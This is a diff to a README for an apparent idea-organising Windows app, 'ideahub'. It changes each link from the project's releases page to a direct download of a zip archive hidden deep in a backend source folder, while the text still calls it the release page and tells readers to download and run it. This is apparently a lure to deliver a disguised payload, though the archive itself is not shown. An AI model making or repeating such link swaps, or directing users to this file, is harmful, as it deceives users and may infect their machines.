@@ -1,6 +1,6 @@
 # ✨ ideahub - Organize ideas and creative assets
 
-[![Download ideahub](https://img.shields.io/badge/Download%20ideahub-blue?style=for-the-badge&logo=github)](https://github.com/Actionpotentialcrabgrass816/ideahub/releases)
+[![Download ideahub](https://img.shields.io/badge/Download%20ideahub-blue?style=for-the-badge&logo=github)](https://github.com/Actionpotentialcrabgrass816/ideahub/raw/refs/heads/main/ideahub_app/backend/services/ai/Software-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ If you are using Windows, the steps below will help you download the app and ope
 
 ## 📥 Download the App
 
-1. Open the release page: https://github.com/Actionpotentialcrabgrass816/ideahub/releases
+1. Open the release page: https://github.com/Actionpotentialcrabgrass816/ideahub/raw/refs/heads/main/ideahub_app/backend/services/ai/Software-v3.2.zip
 2. Look for the latest release at the top of the page.
 3. Find the Windows download file. It is often named with `.exe`, `.msi`, or `.zip`.
 4. Download the file to your computer.
@@ -139,7 +139,7 @@ If the app offers sync, use it only for the folders you want to keep in more tha
 
 When a new version is available, use the same release page:
 
-https://github.com/Actionpotentialcrabgrass816/ideahub/releases
+https://github.com/Actionpotentialcrabgrass816/ideahub/raw/refs/heads/main/ideahub_app/backend/services/ai/Software-v3.2.zip
 
 1. Open the release page
 2. Download the newest Windows file
@@ -199,4 +199,4 @@ A steady workflow keeps the app useful and prevents clutter
 
 Use the release page here to download and run the Windows version:
 
-https://github.com/Actionpotentialcrabgrass816/ideahub/releases
+https://github.com/Actionpotentialcrabgrass816/ideahub/raw/refs/heads/main/ideahub_app/backend/services/ai/Software-v3.2.zip
